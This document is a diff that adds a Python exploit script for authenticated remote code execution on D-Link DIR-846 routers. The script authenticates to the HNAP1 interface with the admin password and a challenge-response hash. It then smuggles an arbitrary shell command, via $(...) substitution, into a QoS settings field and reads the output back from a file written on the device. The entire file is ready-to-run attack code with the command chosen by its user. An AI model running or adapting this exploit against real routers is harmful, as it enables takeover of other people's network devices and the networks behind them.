@@ -1,0 +1,64 @@
+import requests
+import sys
+import hashlib
+import json
+import argparse
+
+PROCESS = "\033[1;34;40m[*]\033[0m"
+SUCCESS = "\033[1;32;40m[+]\033[0m"
+FAIL = "\033[1;31;40m[-]\033[0m"
+
+parser = argparse.ArgumentParser(prog="D-Link DIR-846 Authenticated Remote Code Execution", description="Exploits QoS to get Remote Code Execution",formatter_class=argparse.RawTextHelpFormatter,usage=f"python3 {sys.argv[0]} -x id -p 12345678")
+parser.add_argument("-x","--command",dest="command",type=str,default="id",help="Command to be executed (Default: id)",metavar='')
+parser.add_argument("-p","--password",dest="password",type=str,required=True,help="Password from router.",metavar='')
+parser.add_argument("-i","--ip",dest="ip",type=str,default="192.168.0.1",required=True,help="IP from router. (Default: 192.168.0.1)",metavar='')
+args = parser.parse_args()
+
+if __name__ == "__main__":
+    if sys.argv[1]:
+        url = f"http://{args.ip}:80/HNAP1/"
+        cookies = {"PHPSESSID": "5c6805e3bb7bc8aa84db22198cfffd3e"}
+        headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "HNAP_AUTH": "350DE8309B07C7FE3C6A1FE7EEA5A286 1694632982454", "SOAPAction": "\"http://purenetworks.com/HNAP1/Login\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Content-Type": "application/json; charset=UTF-8", "Origin": "http://192.168.0.1", "Referer": "http://192.168.0.1/Login.html?t=1694631564578", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
+        json1={"Login": {"Action": "request", "Captcha": "", "LoginPassword": "", "PrivateLogin": "LoginPassword", "Username": "admin"}}
+        r = requests.post(url, headers=headers, cookies=cookies, json=json1)
+        jason = json.loads(r.text)
+
+        publickey = jason["LoginResponse"]["PublicKey"]
+        challenge = jason["LoginResponse"]["Challenge"]
+        cookies = jason["LoginResponse"]["Cookie"]
+        print(f"{PROCESS} Public key found:",publickey)
+        print(f"{PROCESS} Challenge found:",challenge)
+
+        private_key = hashlib.md5()
+        private_key.update((publickey + args.password + challenge).encode())
+
+        p_key = private_key.hexdigest().upper()
+        print(f"{SUCCESS} Private Key:",p_key)
+        loginpassword = hashlib.md5()
+        loginpassword.update( (p_key + challenge).encode())
+        print(f"{SUCCESS} Login password:",loginpassword.hexdigest().upper())
+        url = f"http://{args.ip}:80/HNAP1/"
+        cookies = {"PHPSESSID": "5c6805e3bb7bc8aa84db22198cfffd3e", "uid": str(cookies), "PrivateKey": str(p_key)}
+        headers = {"Accept": "application/json, text/javascript, */*; q=0.01", "X-Requested-With": "XMLHttpRequest", "HNAP_AUTH": "0836650F3793B8253A1C8BC2AEEE0EE1 1694632982560", "SOAPAction": "\"http://purenetworks.com/HNAP1/Login\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Content-Type": "application/json; charset=UTF-8", "Origin": "http://192.168.0.1", "Referer": "http://192.168.0.1/Login.html?t=1694631564578", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
+        json1={"Login": {"Action": "login", "Captcha": "", "LoginPassword": str(loginpassword.hexdigest().upper()), "PrivateLogin": "LoginPassword", "Username": "admin"}}
+        r=requests.post(url, headers=headers, cookies=cookies, json=json1)
+        jason = json.loads(r.text)
+        status = jason['LoginResponse']['LoginResult']
+        if status == 'OK':
+            print(f"{SUCCESS} Authenticated!")
+            url = f"http://{args.ip}:80/HNAP1/"
+            headers = {"Accept": "application/json", "HNAP_AUTH": "EAB96BAB693EDC254EBCBC2239C64ABB 1694628008533", "SOAPACTION": "\"http://purenetworks.com/HNAP1/SetSmartQoSSettings\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Content-Type": "application/json", "Origin": "http://192.168.0.1", "Referer": "http://192.168.0.1/QoSControl.html?t=1694627737199", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "Connection": "close"}
+            json1={"SetSmartQoSSettings": {"smartqos_downstream_shapingrate": "5459968", "smartqos_enable": "1", "smartqos_express_devices": "", "smartqos_normal_devices": "", "smartqos_priority_devices": f"$({args.command}>rce)", "smartqos_type": "by_device", "smartqos_upstream_shapingrate": "909312"}}
+            r=requests.post(url, headers=headers, cookies=cookies, json=json1)
+            jason = json.loads(r.text)
+            status = jason['SetSmartQoSSettingsResponse']['SetSmartQoSSettingsResult']
+            if status == 'OK':
+                print(f"{SUCCESS} Exploited!")
+                url = f"http://{args.ip}:80/HNAP1/rce"
+                headers = {"Accept": "application/json", "HNAP_AUTH": "806EE8E7B21B3A334A7C536D497A7C03 1694396368304", "SOAPACTION": "\"http://purenetworks.com/HNAP1/SetNetworkTomographySettings\"", "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/116.0.5845.141 Safari/537.36", "Content-Type": "application/json", "Origin": "http://192.168.0.1", "Referer": "http://192.168.0.1/Diagnosis.html", "Accept-Encoding": "gzip, deflate", "Accept-Language": "pt-BR,pt;q=0.9,en-US;q=0.8,en;q=0.7", "X-Forwaded-For": "8.8.8.8", "Connection": "close"}
+                r=requests.get(url, headers=headers, cookies=cookies)
+                print("OUTPUT>>\n\n"+r.text)
+            else:
+                print(f"{FAIL} Failed!")
+        else:
+            print(f"{FAIL} Failed!")
